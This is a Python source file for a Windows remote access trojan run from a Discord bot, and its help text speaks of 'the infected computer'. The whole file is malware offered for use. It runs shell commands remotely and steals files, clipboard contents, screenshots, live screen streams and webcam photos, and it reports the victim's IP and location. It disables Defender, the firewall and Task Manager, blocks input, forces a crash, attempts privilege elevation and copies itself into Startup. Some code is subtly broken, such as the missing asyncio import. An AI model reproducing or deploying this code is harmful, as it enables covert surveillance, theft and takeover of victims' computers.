import os
import sys
import time
import shutil
import ctypes
import psutil
import cv2
import pyautogui
import requests
import win32clipboard
import subprocess
import mss
import io
import threading
import win32com.client
from PIL import ImageGrab
import discord
from discord.ext import commands
import tkinter as tk
from tkinter import messagebox
from datetime import datetime

# Replace with your own token
bot_token = "YOUR_BOT_TOKEN_HERE"
server_id = "YOUR_SERVER_ID"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = os.path.abspath(__file__)
    target_path = os.path.join(startup_path, os.path.basename(script_path))
    shutil.copy(script_path, target_path)

# Intents for Discord
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def create_startup_shortcut(program_path: str):
    startup_folder = os.path.join(os.getenv("APPDATA"),
                                  r"Microsoft\Windows\Start Menu\Programs\Startup")
    program_name = os.path.splitext(os.path.basename(program_path))[0] + ".lnk"
    shortcut_path = os.path.join(startup_folder, program_name)
    
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.Targetpath = program_path
    shortcut.WorkingDirectory = os.path.dirname(program_path)
    shortcut.save()

@bot.event
async def on_ready():
    print(f'{bot.user} is online.')
    guild = discord.utils.get(bot.guilds, id=int(server_id))
    if guild:
        channel = discord.utils.get(guild.text_channels, name="session")
        if not channel:
            channel = await guild.create_text_channel("session")

        try:
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            public_ip = ip_data.get("ip", "Could not fetch public IP")

            geo_response = requests.get(f"http://ip-api.com/json/{public_ip}")
            geo_data = geo_response.json()

            country_code = geo_data.get("countryCode", "").lower()
            country_flag = f":flag_{country_code}:"

            location_message = (
                f"**Successfully connected, here is some info:**\n"
                f"IP: `{public_ip}`\n"
                f"Country: {geo_data.get('country', 'Unknown')} {country_flag}\n"
                f"City: {geo_data.get('city', 'Unknown')}\n"
                f"Latitude: {geo_data.get('lat', 'Unknown')}\n"
                f"Longitude: {geo_data.get('lon', 'Unknown')}"
            )
            await channel.send(location_message)
        except Exception as e:
            await channel.send(f"**Could not fetch location info:**\n```{str(e)}```")

        await myhelp(channel)

@bot.command(name="myhelp")
async def myhelp(ctx):
    help_text = (
        "Available commands:\n\n"
        "General commands:\n"
        "--> !message <text> = Show a message box with your text.\n"
        "--> !shell <command> = Execute a shell command.\n"
        "--> !voice <phrase> = Speak a phrase aloud using text-to-speech.\n"
        "--> !admincheck = Check if the program has administrator privileges.\n"
        "--> !cd <path> = Change directory.\n"
        "--> !dir = List all items in the current directory.\n"
        "--> !download <file_path> = Download a file from the infected computer.\n"
        "--> !upload = Upload a file to the infected computer (attach file to command).\n"
        "--> !delete <file_path> = Delete a file.\n"
        "--> !write <file_path> <text> = Write text to a file.\n"
        "--> !clipboard = Retrieve the contents of the clipboard.\n"
        "--> !idletime = Get the user's idle time.\n"
        "--> !datetime = Show current date and time.\n"
        "--> !currentdir = Show current working directory.\n\n"
        "Privilege escalation and system control:\n"
        "--> !getadmin [process_name] = Request admin rights via UAC prompt and optionally migrate a process.\n"
        "--> !block = Block keyboard and mouse (admin required).\n"
        "--> !unblock = Unblock keyboard and mouse (admin required).\n"
        "--> !screenshot = Take a screenshot of the user's screen.\n"
        "--> !exit = Shut down the bot.\n"
        "--> !kill <session_name|all> = Terminate a session or all sessions.\n"
        "--> !uacbypass = Attempt to bypass UAC to gain admin rights.\n"
        "--> !shutdown = Shut down the computer.\n"
        "--> !restart = Restart the computer.\n"
        "--> !logoff = Log off the current user.\n"
        "--> !bluescreen = Trigger a Blue Screen of Death (admin required).\n"
        "--> !migrateprocess <process_name> = Migrate a running process to a new instance.\n\n"
        "Security and system modifications:\n"
        "--> !prockill <process_name> = Kill a process by name.\n"
        "--> !disabledefender = Disable Windows Defender (admin required).\n"
        "--> !disablefirewall = Disable Windows Firewall (admin required).\n"
        "--> !critproc = Make the program a critical process (admin required).\n"
        "--> !uncritproc = Remove critical process status (admin required).\n"
        "--> !website <url> = Open a website on the infected computer.\n"
        "--> !disabletaskmgr = Disable Task Manager (admin required).\n"
        "--> !enabletaskmgr = Enable Task Manager (admin required).\n"
        "--> !startup <program_path> = Add a program to Windows startup.\n\n"
        "Geolocation and other commands:\n"
        "--> !geolocate [ip] = Geolocate the computer (or provided IP).\n"
        "--> !listprocess = List all running processes (sends as .txt).\n"
        "--> !infocounts = Get system account information.\n"
        "--> !getcams = List available camera names.\n"
        "--> !selectcam <number> = Select a camera to take a photo.\n"
        "--> !webcampic = Take a photo with the selected webcam.\n"
        "--> !myhelp = Show this help menu.\n"
        "--> !stream <interval_seconds> = Start live screen streaming.\n"
        "--> !stopstream = Stop live screen streaming.\n"
        "--> !streamstatus = Check streaming status.\n\n"
        "Test commands:\n"
        "--> !testadmin = Test admin check.\n"
        "--> !testscreenshot = Test screenshot library."
    )

    file_path = "help_commands.txt"
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(help_text)
    
    await ctx.send("Here is the help file:", file=discord.File(file_path))
    os.remove(file_path)

@bot.command()
async def getadmin(ctx, process_name: str = None):
    if is_admin():
        await ctx.send("You already have administrator privileges.")
    else:
        try:
            subprocess.run("""powershell -Command "Start-Process cmd -ArgumentList '/C echo Privileges granted' -Verb RunAs" """, shell=True)
            await ctx.send("Administrator privileges obtained.")

            if process_name:
                migrated_process = None
                for proc in psutil.process_iter(['pid', 'name']):
                    if process_name.lower() in proc.info['name'].lower():
                        migrated_process = proc
                        break

                if migrated_process is None:
                    await ctx.send(f"**Error:** No running process named `{process_name}` found.")
                    return
                
                process_path = migrated_process.exe()
                subprocess.run(f"powershell -Command Start-Process '{process_path}' -Verb RunAs", shell=True)
                await ctx.send(f"**Success:** Process `{process_name}` migrated to a new elevated process.")
                migrated_process.terminate()
                time.sleep(2)
                await ctx.send(f"**Original process `{process_name}` has been closed and migrated.**")
            else:
                await ctx.send("No process name provided for migration.")
        except Exception as e:
            await ctx.send(f"**Error:** {str(e)}")

@bot.command()
async def admincheck(ctx):
    if is_admin():
        await ctx.send("```The program has administrator privileges.```")
    else:
        await ctx.send("```The program does NOT have administrator privileges.```")

@bot.command()
async def message(ctx, *, text: str):
    pyautogui.alert(text)
    await ctx.send("```Message displayed on the machine.```")

@bot.command()
async def shell(ctx, *, command: str):
    await ctx.send(f"```yaml\nExecuting command: {command}\n```")
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        await ctx.send(f"```{result.stdout}```")
    else:
        await ctx.send(f"```Error:\n{result.stderr}```")

@bot.command()
async def voice(ctx, *, text: str):
    from pyttsx3 import init
    tts = init()
    tts.say(text)
    tts.runAndWait()
    await ctx.send("```Text spoken aloud.```")

@bot.command()
async def cd(ctx, *, path: str):
    try:
        os.chdir(path)
        await ctx.send(f"```Directory changed to: {os.getcwd()}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def dir(ctx):
    try:
        items = os.listdir()
        await ctx.send(f"```{items}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def download(ctx, *, file_path: str):
    try:
        with open(file_path, "rb") as file:
            await ctx.send(file=discord.File(file, os.path.basename(file_path)))
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def upload(ctx):
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            await attachment.save(attachment.filename)
        await ctx.send("```File(s) uploaded successfully.```")
    else:
        await ctx.send("```No file attached.```")

@bot.command()
async def clipboard(ctx):
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        await ctx.send(f"```{data}```")
    except Exception as e:
        await ctx.send(f"```Error reading clipboard: {str(e)}```")

@bot.command()
async def screenshot(ctx):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
        os.remove("screenshot.png")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def block(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    ctypes.windll.user32.BlockInput(True)
    await ctx.send("```Keyboard and mouse blocked.```")

@bot.command()
async def unblock(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    ctypes.windll.user32.BlockInput(False)
    await ctx.send("```Keyboard and mouse unblocked.```")

@bot.command()
async def idletime(ctx):
    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        seconds = millis // 1000
        await ctx.send(f"```Idle time: {seconds} seconds.```")
    else:
        await ctx.send("```Error getting idle time.```")

@bot.command()
async def prockill(ctx, *, process_name: str):
    try:
        result = subprocess.run(f"taskkill /IM {process_name} /F", shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            await ctx.send(f"```Process {process_name} terminated successfully.```")
        else:
            await ctx.send(f"```Error terminating process: {result.stderr}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def disabledefender(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    try:
        subprocess.run("""powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" """, shell=True)
        await ctx.send("```Windows Defender disabled.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def disablefirewall(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    try:
        subprocess.run("""powershell -Command "netsh advfirewall set allprofiles state off" """, shell=True)
        await ctx.send("```Firewall disabled.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def listprocess(ctx):
    try:
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        file_path = "process_list.txt"
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(result.stdout)
        await ctx.send("Here is the list of active processes:", file=discord.File(file_path))
        os.remove(file_path)
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def current_time(ctx):
    now = datetime.now()
    await ctx.send(f"Current time: {now.strftime('%Y-%m-%d %H:%M:%S')}")

@bot.command()
async def shutdown(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    subprocess.run("shutdown /s /t 1", shell=True)
    await ctx.send("```Shutting down system...```")

@bot.command()
async def restart(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    subprocess.run("shutdown /r /t 1", shell=True)
    await ctx.send("```Restarting system...```")

@bot.command()
async def logoff(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    subprocess.run("shutdown /l", shell=True)
    await ctx.send("```Logging off...```")

@bot.command()
async def bluescreen(ctx):
    try:
        await ctx.send("Attempting to generate Blue Screen of Death (BSOD)...")
        subprocess.run("taskkill /IM svchost.exe /F", shell=True, check=True)
        await ctx.send("Command executed. If the system permits, a BSOD may be generated.")
    except Exception as e:
        await ctx.send(f"Error executing command: {e}")

@bot.command()
async def disabletaskmgr(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    try:
        subprocess.run("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /t REG_DWORD /d 1 /f", shell=True)
        await ctx.send("```Task Manager disabled.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def enabletaskmgr(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    try:
        subprocess.run("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskmgr /f", shell=True)
        await ctx.send("```Task Manager enabled.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def currentdir(ctx):
    try:
        current_dir = os.getcwd()
        await ctx.send(f"```Current directory: {current_dir}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def website(ctx, url: str):
    try:
        subprocess.run(f"start {url}", shell=True)
        await ctx.send(f"```Website {url} opened in default browser.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def exit(ctx):
    await ctx.send("```Shutting down the bot...```")
    await bot.close()

@bot.command()
async def critproc(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(True, False, False)
    await ctx.send("```The program is now a critical process.```")

@bot.command()
async def uncritproc(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    ctypes.windll.ntdll.RtlSetProcessIsCritical(False, False, False)
    await ctx.send("```The program is no longer a critical process.```")

@bot.command(name="takescreenshot")
async def takescreenshot(ctx):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
        await ctx.send(file=discord.File("screenshot.png"))
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command(name="blockkeyboard")
async def blockkeyboard(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    try:
        subprocess.run("RUNDLL32 user32.dll,LockWorkStation", shell=True)
        await ctx.send("```Keyboard and mouse blocked.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command(name="copyclipboard")
async def copyclipboard(ctx):
    try:
        import pyperclip
        clipboard_content = pyperclip.paste()
        await ctx.send(f"```Clipboard content: {clipboard_content}```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command(name="uploadFile")
async def uploadFile(ctx):
    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            await attachment.save(attachment.filename)
            await ctx.send(f"```File {attachment.filename} uploaded successfully.```")
    else:
        await ctx.send("```No file attached.```")

@bot.command()
async def uacbypass(ctx):
    if not is_admin():
        await ctx.send("```Administrator privileges required.```")
        return
    try:
        subprocess.run("start %windir%\\System32\\slui.exe", shell=True)
        await ctx.send("```Attempting UAC bypass...```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def geolocate(ctx, ip_address: str = None):
    try:
        if ip_address is None:
            ip_response = requests.get("https://api.ipify.org?format=json")
            ip_data = ip_response.json()
            ip_address = ip_data.get("ip")
        
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        location_data = response.json()

        if location_data.get("status") == "fail":
            await ctx.send(f"Error geolocating IP: {ip_address}")
            return

        country_code = location_data['countryCode']
        country_flag = f":flag_{country_code.lower()}:"

        location_message = (
            f"**Location of {ip_address}:**\n"
            f"City: {location_data['city']}\n"
            f"Country: {location_data['country']} {country_flag}\n"
            f"Latitude: {location_data['lat']}\n"
            f"Longitude: {location_data['lon']}"
        )
        await ctx.send(location_message)
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def kill(ctx, session_name: str):
    try:
        if session_name == "all":
            subprocess.run("taskkill /F /IM python.exe", shell=True)
            await ctx.send("```All sessions terminated.```")
        else:
            subprocess.run(f"taskkill /F /IM {session_name}.exe", shell=True)
            await ctx.send(f"```Session {session_name} terminated.```")
    except Exception as e:
        await ctx.send(f"```Error: {str(e)}```")

@bot.command()
async def delete(ctx, file_path: str):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            await ctx.send(f"File `{file_path}` deleted successfully.")
        else:
            await ctx.send(f"File `{file_path}` not found.")
    except Exception as e:
        await ctx.send(f"Error deleting file: {str(e)}")

@bot.command()
async def write(ctx, file_path: str, *, text: str):
    try:
        with open(file_path, "w") as file:
            file.write(text)
        await ctx.send(f"Text written to `{file_path}`.")
    except Exception as e:
        await ctx.send(f"Error writing to file: {str(e)}")

@bot.command()
async def startup(ctx, program_path: str):
    try:
        if not os.path.exists(program_path):
            await ctx.send(f"Program `{program_path}` not found.")
            return
        
        create_startup_shortcut(program_path)
        await ctx.send(f"Program `{os.path.basename(program_path)}` added to startup successfully.")
    except Exception as e:
        await ctx.send(f"Error adding to startup: {str(e)}")

@bot.command()
async def getcams(ctx):
    try:
        index = 0
        cams = []
        while True:
            cap = cv2.VideoCapture(index)
            if not cap.isOpened():
                break
            cams.append(f"Camera {index}")
            cap.release()
            index += 1
        
        if cams:
            await ctx.send(f"List of available cameras: {', '.join(cams)}")
        else:
            await ctx.send("No cameras found.")
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def selectcam(ctx, cam_number: int):
    try:
        cap = cv2.VideoCapture(cam_number)
        if not cap.isOpened():
            await ctx.send(f"Camera {cam_number} not found.")
            return
        
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("captured_image.jpg", frame)
            await ctx.send("Picture taken successfully!")
        else:
            await ctx.send("Failed to capture image.")
        cap.release()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def webcampic(ctx):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            await ctx.send("No camera found.")
            return
        
        ret, frame = cap.read()
        if ret:
            image_path = "webcam_picture.jpg"
            cv2.imwrite(image_path, frame)
            await ctx.send("Picture taken successfully!", file=discord.File(image_path))
        else:
            await ctx.send("Failed to capture image.")
        cap.release()
    except Exception as e:
        await ctx.send(f"Error: {str(e)}")

@bot.command()
async def migrateprocess(ctx, process_name: str):
    try:
        migrated_process = None
        for proc in psutil.process_iter(['pid', 'name']):
            if process_name.lower() in proc.info['name'].lower():
                migrated_process = proc
                break

        if migrated_process is None:
            await ctx.send(f"**Error:** No running process named `{process_name}` found.")
            return
        
        process_path = migrated_process.exe()
        subprocess.Popen([process_path])
        await ctx.send(f"**Success:** Process `{process_name}` migrated to a new process.")
        migrated_process.terminate()
        time.sleep(2)
        await ctx.send(f"**Original process `{process_name}` has been closed and migrated.**")
    except Exception as e:
        await ctx.send(f"**Error:** {str(e)}")

@bot.command()
async def infocounts(ctx):
    try:
        user_info_result = subprocess.run(
            ["powershell.exe", "Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID"],
            capture_output=True, text=True
        )
        user_info = user_info_result.stdout.strip()
        await ctx.send(f"**System account info:**\n{user_info}")
    except Exception as e:
        await ctx.send(f"**Error retrieving info:** {str(e)}")

# ------------------------- STREAMING -------------------------
@bot.command()
async def stream(ctx, interval: int = 5):
    if not is_admin():
        await ctx.send("❌ Administrator privileges required to use this command!")
        return
    
    if interval < 1 or interval > 30:
        await ctx.send("⚠️ Interval must be between 1 and 30 seconds!")
        return
    
    if not hasattr(bot, 'streaming'):
        bot.streaming = False
        bot.stream_channel = None
    
    if bot.streaming:
        await ctx.send("⚠️ A stream is already running! Use `!stopstream` to stop it.")
        return
    
    bot.streaming = True
    bot.stream_channel = ctx.channel
    await ctx.send(f"🖥️ Live stream started (interval: {interval}s)")
    await ctx.send("Use `!stopstream` to stop the stream.")
    
    def stream_loop():
        while bot.streaming:
            try:
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    screenshot = sct.grab(monitor)
                    from PIL import Image
                    img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
                    img = img.resize((int(img.width * 0.7), int(img.height * 0.7)), Image.Resampling.LANCZOS)
                    with io.BytesIO() as output:
                        img.save(output, format='JPEG', quality=75, optimize=True)
                        output.seek(0)
                        if len(output.getvalue()) < 8 * 1024 * 1024:
                            asyncio.run_coroutine_threadsafe(
                                bot.stream_channel.send(file=discord.File(fp=output, filename='stream.jpg')),
                                bot.loop
                            )
                        else:
                            asyncio.run_coroutine_threadsafe(
                                bot.stream_channel.send("⚠️ Screenshot too large for Discord!"),
                                bot.loop
                            )
                time.sleep(interval)
            except Exception as e:
                print(f"Stream error: {e}")
                bot.streaming = False
                asyncio.run_coroutine_threadsafe(
                    bot.stream_channel.send(f"❌ Stream stopped due to error: {str(e)}"),
                    bot.loop
                )
                break
    
    thread = threading.Thread(target=stream_loop)
    thread.daemon = True
    thread.start()

@bot.command()
async def stopstream(ctx):
    if not is_admin():
        await ctx.send("❌ Administrator privileges required to use this command!")
        return
    
    if not hasattr(bot, 'streaming') or not bot.streaming:
        await ctx.send("⚠️ No stream is currently running!")
        return
    
    bot.streaming = False
    await ctx.send("🛑 Live stream stopped!")

@bot.command()
async def streamstatus(ctx):
    if not hasattr(bot, 'streaming') or not bot.streaming:
        await ctx.send("📺 Status: No stream active")
    else:
        await ctx.send("📺 Status: Stream is running")

# ------------------------- TEST COMMANDS -------------------------
@bot.command()
async def testadmin(ctx):
    if is_admin():
        await ctx.send("✅ Admin check passed!")
    else:
        await ctx.send("❌ Admin check failed!")

@bot.command()
async def testscreenshot(ctx):
    if not is_admin():
        await ctx.send("❌ Administrator privileges required!")
        return
        
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            await ctx.send("✅ Screenshot library (mss) works!")
    except Exception as e:
        await ctx.send(f"❌ Screenshot library error: {str(e)}")

# Run the bot
bot.run(bot_token)
run_as_admin()
add_to_startup()